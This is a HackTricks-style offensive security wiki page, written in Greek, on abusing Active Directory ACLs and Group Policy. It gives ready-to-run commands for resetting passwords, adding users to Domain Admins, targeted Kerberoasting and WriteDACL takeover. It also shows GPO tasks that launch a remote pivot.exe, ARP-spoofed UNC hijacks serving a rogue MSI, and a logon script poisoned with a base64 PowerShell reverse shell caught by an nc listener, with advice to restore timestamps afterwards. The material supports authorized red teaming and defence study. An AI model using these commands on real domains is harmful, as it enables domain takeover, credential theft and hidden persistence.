# Κατάχρηση Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα είναι κυρίως μια σύνοψη των τεχνικών από** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, ελέγξτε τα αρχικά άρθρα.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Αυτό το privilege δίνει σε έναν attacker πλήρη έλεγχο πάνω σε έναν target user account. Μόλις επιβεβαιωθούν τα δικαιώματα `GenericAll` με τη χρήση της εντολής `Get-ObjectAcl`, ένας attacker μπορεί να:

- **Αλλάξει τον Κωδικό Πρόσβασης του Target**: Χρησιμοποιώντας `net user <username> <password> /domain`, ο attacker μπορεί να κάνει reset τον κωδικό πρόσβασης του χρήστη.
- Από Linux, μπορείτε να κάνετε το ίδιο μέσω SAMR με Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Αν ο λογαριασμός είναι απενεργοποιημένος, καθάρισε το UAC flag**: `GenericAll` επιτρέπει την επεξεργασία του `userAccountControl`. Από Linux, το BloodyAD μπορεί να αφαιρέσει το `ACCOUNTDISABLE` flag:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Αναθέστε ένα SPN στον λογαριασμό του χρήστη για να τον κάνετε kerberoastable, και μετά χρησιμοποιήστε Rubeus και targetedKerberoast.py για να εξαγάγετε και να επιχειρήσετε να σπάσετε τα hashes του ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Απενεργοποίησε το pre-authentication για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο σε ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Με `GenericAll` σε έναν χρήστη μπορείς να προσθέσεις ένα certificate-based credential και να κάνεις authenticate ως αυτός χωρίς να αλλάξεις το password του. Δες:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Αυτό το privilege επιτρέπει σε έναν attacker να χειριστεί group memberships αν έχει `GenericAll` rights σε ένα group όπως το `Domain Admins`. Αφού εντοπίσει το distinguished name του group με `Get-NetGroup`, ο attacker μπορεί να:

- **Προσθέσει τον εαυτό του στο Domain Admins Group**: Αυτό μπορεί να γίνει μέσω direct commands ή χρησιμοποιώντας modules όπως Active Directory ή PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Από Linux μπορείτε επίσης να αξιοποιήσετε το BloodyAD για να προσθέσετε τον εαυτό σας σε αυθαίρετες ομάδες όταν έχετε GenericAll/Write membership πάνω τους. Αν η ομάδα-στόχος είναι nested μέσα στο “Remote Management Users”, θα αποκτήσετε άμεσα πρόσβαση WinRM σε hosts που τιμούν αυτήν την ομάδα:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Η κατοχή αυτών των προνομίων σε ένα computer object ή σε έναν user account επιτρέπει:

- **Kerberos Resource-based Constrained Delegation**: Επιτρέπει την ανάληψη ενός computer object.
- **Shadow Credentials**: Χρησιμοποίησε αυτή την τεχνική για να υποδυθείς ένα computer ή user account εκμεταλλευόμενος τα προνόμια για τη δημιουργία shadow credentials.

## **WriteProperty on Group**

Αν ένας user έχει δικαιώματα `WriteProperty` σε όλα τα objects για ένα συγκεκριμένο group (π.χ. `Domain Admins`), μπορεί:

- **Add Themselves to the Domain Admins Group**: Επιτυγχάνεται μέσω συνδυασμού των εντολών `net user` και `Add-NetGroupUser`, αυτή η μέθοδος επιτρέπει privilege escalation μέσα στο domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Αυτό το privilege επιτρέπει στους attackers να προσθέτουν τους εαυτούς τους σε συγκεκριμένα groups, όπως το `Domain Admins`, μέσω commands που χειρίζονται άμεσα το group membership. Η χρήση της ακόλουθης ακολουθίας commands επιτρέπει την αυτο-προσθήκη:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Μια παρόμοια privilege, αυτό επιτρέπει σε attackers να προσθέτουν απευθείας τους εαυτούς τους σε groups τροποποιώντας group properties, αν έχουν το `WriteProperty` right σε αυτά τα groups. Η επιβεβαίωση και η εκτέλεση αυτής της privilege πραγματοποιούνται με:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει επαναφορές κωδικού πρόσβασης χωρίς να είναι γνωστός ο τρέχων κωδικός. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να γίνουν μέσω PowerShell ή εναλλακτικών command-line tools, προσφέροντας αρκετούς τρόπους για να γίνει reset του κωδικού ενός χρήστη, συμπεριλαμβανομένων interactive sessions και one-liners για non-interactive περιβάλλοντα. Οι εντολές κυμαίνονται από απλές PowerShell κλήσεις μέχρι τη χρήση του `rpcclient` σε Linux, δείχνοντας την ευελιξία των attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Αν ένας επιτιθέμενος διαπιστώσει ότι έχει δικαιώματα `WriteOwner` πάνω σε ένα group, μπορεί να αλλάξει την ιδιοκτησία του group στον εαυτό του. Αυτό είναι ιδιαίτερα σημαντικό όταν το group στο οποίο αναφέρεται είναι το `Domain Admins`, καθώς η αλλαγή της ιδιοκτησίας επιτρέπει ευρύτερο έλεγχο στα attributes και στη membership του group. Η διαδικασία περιλαμβάνει τον εντοπισμό του σωστού object μέσω του `Get-ObjectAcl` και έπειτα τη χρήση του `Set-DomainObjectOwner` για να τροποποιηθεί ο owner, είτε μέσω SID είτε μέσω name.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite σε User**

Αυτή η permission επιτρέπει σε έναν attacker να τροποποιεί properties χρήστη. Συγκεκριμένα, με `GenericWrite` access, ο attacker μπορεί να αλλάξει το logon script path ενός user ώστε να εκτελεί ένα malicious script κατά το user logon. Αυτό επιτυγχάνεται με τη χρήση της εντολής `Set-ADObject` για να ενημερωθεί το `scriptpath` property του target user ώστε να δείχνει στο script του attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite σε Group**

Με αυτό το privilege, οι attackers μπορούν να χειριστούν τη membership του group, όπως να προσθέσουν τον εαυτό τους ή άλλους users σε συγκεκριμένα groups. Αυτή η διαδικασία περιλαμβάνει τη δημιουργία ενός credential object, τη χρήση του για να προσθέσουν ή να αφαιρέσουν users από ένα group, και την επαλήθευση των αλλαγών στη membership με PowerShell commands.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Από Linux, το Samba `net` μπορεί να προσθέσει/αφαιρέσει μέλη όταν έχετε `GenericWrite` στην ομάδα (χρήσιμο όταν το PowerShell/RSAT δεν είναι διαθέσιμα):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Η κατοχή ενός AD object και η ύπαρξη `WriteDACL` privileges σε αυτό επιτρέπει σε έναν attacker να παραχωρήσει στον εαυτό του `GenericAll` privileges πάνω στο object. Αυτό επιτυγχάνεται μέσω ADSI manipulation, επιτρέποντας πλήρη έλεγχο πάνω στο object και τη δυνατότητα τροποποίησης των group memberships του. Παρ' όλα αυτά, υπάρχουν περιορισμοί όταν επιχειρείται η εκμετάλλευση αυτών των privileges χρησιμοποιώντας τα cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner γρήγορη ανάληψη (PowerView)

Όταν έχετε `WriteOwner` και `WriteDacl` πάνω σε έναν user ή service account, μπορείτε να πάρετε πλήρη έλεγχο και να κάνετε reset το password του χρησιμοποιώντας PowerView χωρίς να γνωρίζετε το παλιό password:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Σημειώσεις:
- Μπορεί να χρειαστεί πρώτα να αλλάξεις τον ιδιοκτήτη στον εαυτό σου αν έχεις μόνο `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Επικυρώστε την πρόσβαση με οποιοδήποτε protocol (SMB/LDAP/RDP/WinRM) μετά το password reset.

## **Replication on the Domain (DCSync)**

Η επίθεση DCSync αξιοποιεί συγκεκριμένα replication permissions στο domain για να μιμηθεί έναν Domain Controller και να συγχρονίσει data, συμπεριλαμβανομένων των user credentials. Αυτή η ισχυρή technique απαιτεί permissions όπως `DS-Replication-Get-Changes`, επιτρέποντας στους attackers να εξάγουν sensitive πληροφορίες από το AD environment χωρίς άμεση πρόσβαση σε Domain Controller. [**Μάθετε περισσότερα για την επίθεση DCSync εδώ.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Η delegated access για τη διαχείριση Group Policy Objects (GPOs) μπορεί να ενέχει σημαντικούς security κινδύνους. Για παράδειγμα, αν σε έναν user όπως ο `offense\spotless` έχουν δοθεί GPO management rights, μπορεί να έχει privileges όπως **WriteProperty**, **WriteDacl**, και **WriteOwner**. Αυτά τα permissions μπορούν να abused για malicious σκοπούς, όπως εντοπίζεται με το PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Για να εντοπίσετε misconfigured GPOs, τα cmdlets του PowerSploit μπορούν να συνδυαστούν. Αυτό επιτρέπει την ανακάλυψη GPOs που ένας συγκεκριμένος user έχει permissions να διαχειρίζεται: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Είναι δυνατό να προσδιορίσετε σε ποια computers εφαρμόζεται ένα συγκεκριμένο GPO, βοηθώντας στην κατανόηση του εύρους του δυνητικού impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Για να δείτε ποιες policies εφαρμόζονται σε έναν συγκεκριμένο computer, μπορούν να χρησιμοποιηθούν commands όπως το `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Ο εντοπισμός organizational units (OUs) που επηρεάζονται από μια συγκεκριμένη policy μπορεί να γίνει χρησιμοποιώντας το `Get-DomainOU`.

Μπορείτε επίσης να χρησιμοποιήσετε το tool [**GPOHound**](https://github.com/cogiceo/GPOHound) για να enumerate GPOs και να βρείτε issues σε αυτά.

### Abuse GPO - New-GPOImmediateTask

Τα misconfigured GPOs μπορούν να exploited για την εκτέλεση code, για παράδειγμα δημιουργώντας μια immediate scheduled task. Αυτό μπορεί να γίνει για να προστεθεί ένας user στην τοπική ομάδα administrators σε επηρεαζόμενα machines, αυξάνοντας σημαντικά τα privileges:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Το module GroupPolicy, αν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και τη σύνδεση νέων GPOs, καθώς και τη ρύθμιση προτιμήσεων όπως τιμές registry για την εκτέλεση backdoors σε επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί το GPO να ενημερωθεί και έναν χρήστη να συνδεθεί στον υπολογιστή για να εκτελεστεί:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

Το SharpGPOAbuse προσφέρει μια μέθοδο για να abuse υπάρχοντα GPOs προσθέτοντας tasks ή τροποποιώντας ρυθμίσεις χωρίς την ανάγκη δημιουργίας νέων GPOs. Αυτό το εργαλείο απαιτεί τροποποίηση υπαρχόντων GPOs ή χρήση RSAT tools για τη δημιουργία νέων πριν από την εφαρμογή αλλαγών:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

Τα GPO updates συνήθως συμβαίνουν περίπου κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά από την εφαρμογή μιας αλλαγής, η εντολή `gpupdate /force` μπορεί να χρησιμοποιηθεί στον target computer για να επιβληθεί άμεσο policy update. Αυτή η εντολή διασφαλίζει ότι οποιεσδήποτε τροποποιήσεις στα GPOs εφαρμόζονται χωρίς να περιμένετε τον επόμενο αυτόματο κύκλο update.

### Under the Hood

Κατά την επιθεώρηση των Scheduled Tasks για ένα συγκεκριμένο GPO, όπως το `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη tasks όπως το `evilTask`. Αυτά τα tasks δημιουργούνται μέσω scripts ή command-line tools με στόχο να τροποποιήσουν τη συμπεριφορά του συστήματος ή να escalate privileges.

Η δομή του task, όπως φαίνεται στο XML configuration file που δημιουργείται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες του scheduled task - συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των triggers του. Αυτό το αρχείο δείχνει πώς ορίζονται και διαχειρίζονται τα scheduled tasks μέσα στα GPOs, παρέχοντας μια μέθοδο για την εκτέλεση arbitrary commands ή scripts ως μέρος της policy enforcement.

### Users and Groups

Τα GPOs επιτρέπουν επίσης τον χειρισμό των user και group memberships σε target systems. Επεξεργάζοντας απευθείας τα Users and Groups policy files, οι attackers μπορούν να προσθέσουν users σε privileged groups, όπως το τοπικό `administrators` group. Αυτό είναι δυνατό μέσω της delegation των GPO management permissions, η οποία επιτρέπει την τροποποίηση των policy files ώστε να περιλαμβάνουν νέους users ή να αλλάζουν group memberships.

Το XML configuration file για τα Users and Groups περιγράφει πώς υλοποιούνται αυτές οι αλλαγές. Προσθέτοντας entries σε αυτό το αρχείο, συγκεκριμένοι users μπορούν να λάβουν elevated privileges σε affected systems. Αυτή η μέθοδος προσφέρει μια άμεση προσέγγιση για privilege escalation μέσω GPO manipulation.

Επιπλέον, μπορούν επίσης να εξεταστούν πρόσθετες μέθοδοι για την εκτέλεση code ή τη διατήρηση persistence, όπως η αξιοποίηση logon/logoff scripts, η τροποποίηση registry keys για autoruns, η εγκατάσταση software μέσω .msi files ή η επεξεργασία service configurations. Αυτές οι τεχνικές παρέχουν διάφορες οδούς για τη διατήρηση πρόσβασης και τον έλεγχο target systems μέσω της abuse των GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

Το `WriteGPLink` πάνω σε ένα OU/domain σου επιτρέπει να τροποποιήσεις το `gPLink` attribute του target container και να **force an existing GPO to apply** χωρίς να επεξεργαστείς το ίδιο το GPO. Αυτό γίνεται ενδιαφέρον όταν το linked GPO αναφέρεται ήδη σε remote content μέσω **UNC paths** (`\\HOST\share\...`), επειδή οι authenticated users μπορούν να διαβάσουν το **SYSVOL** και να εντοπίσουν reusable policies offline.

High-level workflow:

1. Χρησιμοποίησε το BloodHound για να εντοπίσεις ένα principal με `WriteGPLink` πάνω σε ένα OU και να enumerate computers/users μέσα σε αυτό το OU.
2. Κάνε clone το `SYSVOL` read-only και κάνε parse τα GPOs αναζητώντας **Software Installation**, **drive mappings** (`Drives.xml`) και **logon/startup scripts** που αναφέρονται σε UNC paths.
3. Προτίμησε policies που δείχνουν σε **direct hostname** (για παράδειγμα `\\DC02\share\pkg.msi`) αντί για DFS/domain-namespace paths, επειδή τα hostname-based paths είναι ευκολότερο να redirected με L2 spoofing.
4. Πρόσθεσε το επιλεγμένο GPO GUID στο `gPLink` του target OU ώστε το victim να επεξεργαστεί αυτήν την ήδη υπάρχουσα policy.
5. Στο ίδιο broadcast domain, κάνε ARP spoof το UNC host και κάνε bind το IP του τοπικά (`ip addr add <target_ip>/32 dev <iface>`) ώστε η SMB traffic του victim να φτάσει στον host σου.
6. Σέρβιρε το αναμενόμενο path/filename από έναν attacker SMB server (για παράδειγμα `smbserver.py`) και περίμενε το normal policy processing.

Example `SYSVOL` collection and GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Σύνδεσε το υπάρχον GPO στο target OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Αν το συνδεδεμένο GPO αναπτύσσει ένα MSI από ένα UNC path, ο client θα το ανακτήσει κατά το **computer startup** και θα το εγκαταστήσει ως **`NT AUTHORITY\SYSTEM`**. Με spoofing του referenced host και σερβίροντας ένα malicious MSI κάτω από το **ίδιο share/path/name**, μπορείς να μετατρέψεις το **WriteGPLink** σε SYSTEM code execution **χωρίς να τροποποιήσεις το SYSVOL**.

Σημαντικοί περιορισμοί:

- **Το timing έχει σημασία**: το νέο link γίνεται ορατό στο policy refresh (συνήθως ~90 minutes), αλλά το **Software Installation** συνήθως ενεργοποιείται στο **reboot**.
- Το Windows Installer συνήθως παρακολουθεί το deployment χρησιμοποιώντας το package **`ProductCode`**. Αν το προϊόν είναι ήδη εγκατεστημένο, το deployment μπορεί να παραλειφθεί.
- Για να αποφύγεις installer rejection, κάνε patch το rogue MSI ώστε το **`ProductCode`** και το **`PackageCode`** να ταιριάζουν με το legitimate package που αναμένει το GPO.
- Παλιά `.aas` advertisement files μπορεί να παραμένουν στο `SYSVOL`, οπότε επιβεβαίωσε ότι το deployment εξακολουθεί να φαίνεται ενεργό πριν βασιστείς σε αυτό.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` κάνουν τους χρήστες να αυθεντικοποιούνται στο configured UNC path κατά το logon ή τη reconnection. Αν spoof-άρεις το referenced host, μπορείς να capture **NetNTLMv2**. Αν το SMB αποτύχει σκόπιμα, το Windows μπορεί να κάνει retry μέσω **WebDAV**, στέλνοντας **NTLM over HTTP**, κάτι που είναι πολύ πιο ευέλικτο για relays προς **LDAP(S)**, **AD CS**, ή **SMB**.

#### Logon/startup script UNC hijack

Το ίδιο pattern ισχύει για UNC-hosted scripts που εντοπίζονται στο `SYSVOL`:

- **Logon scripts** συνήθως εκτελούνται στο context του **user**.
- **Startup scripts** συνήθως εκτελούνται στο context του **computer / SYSTEM**.

Αν το script path δείχνει σε hostname που μπορείς να spoof-άρεις, redirect το UNC host και σερβίρισε replacement script content από το αναμενόμενο location.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths κάτω από `\\<dc>\SYSVOL\<domain>\scripts\` ή `\\<dc>\NETLOGON\` επιτρέπουν tampering με logon scripts που εκτελούνται στο user logon μέσω GPO. Αυτό δίνει code execution στο security context των χρηστών που κάνουν logon.

### Locate logon scripts
- Inspect user attributes για ένα configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Ανίχνευσε domain shares για να εντοπίσεις shortcuts ή αναφορές σε scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Ανάλυσε αρχεία `.lnk` για να επιλύσεις targets που δείχνουν σε SYSVOL/NETLOGON (χρήσιμο DFIR trick και για attackers χωρίς άμεση πρόσβαση σε GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- Το BloodHound εμφανίζει το `logonScript` (scriptPath) attribute σε user nodes όταν υπάρχει.

### Επικύρωση write access (μην εμπιστεύεστε share listings)
Automated tooling μπορεί να δείχνει το SYSVOL/NETLOGON ως read-only, αλλά τα υποκείμενα NTFS ACLs μπορεί ακόμα να επιτρέπουν writes. Πάντα να δοκιμάζετε:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
### Δηλητηρίασε ένα VBScript logon script για RCE
Πρόσθεσε μια εντολή που εκκινεί ένα PowerShell reverse shell (generate from revshells.com) και κράτησε την αρχική λογική ώστε να μην σπάσει η επιχειρησιακή λειτουργία:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Άκου στον host σου και περίμενε για το επόμενο interactive logon:
```bash
rlwrap -cAr nc -lnvp 443
```
Σημειώσεις:
- Η εκτέλεση γίνεται με το token του logging user (όχι SYSTEM). Το scope είναι το GPO link (OU, site, domain) που εφαρμόζει αυτό το script.
- Κάνε clean up επαναφέροντας το αρχικό περιεχόμενο/timestamps μετά τη χρήση.


## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
